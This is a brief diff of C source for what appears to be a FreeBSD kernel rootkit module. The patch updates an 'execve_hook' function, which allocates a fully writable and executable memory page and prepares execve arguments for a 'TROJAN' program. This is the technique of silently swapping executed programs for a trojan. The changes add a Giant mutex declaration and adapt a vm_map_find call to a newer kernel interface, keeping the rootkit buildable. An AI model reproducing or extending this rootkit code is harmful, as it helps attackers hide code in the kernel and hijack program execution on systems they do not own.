@@ -22,6 +22,7 @@
 */
 extern linker_file_list_t linker_files;
 extern struct mtx kld_mtx;
+extern struct mtx Giant;
 extern int next_file_id;
 typedef TAILQ_HEAD(, module) modulelist_t;
 extern modulelist_t modules;
@@ -75,8 +76,7 @@ execve_hook(struct thread *td, void *syscall_args)
 	* Allocate a PAGE_SIZE null region of memory for a new set
 	* of execve arguments.
 	*/
-	vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE,
-	VM_PROT_ALL, VM_PROT_ALL, 0);
+	vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE, FALSE, VM_PROT_ALL, VM_PROT_ALL, 0, 0);
 	vm->vm_dsize += btoc(PAGE_SIZE);
 	/*
 	* Set up an execve_args structure for TROJAN. Remember, you
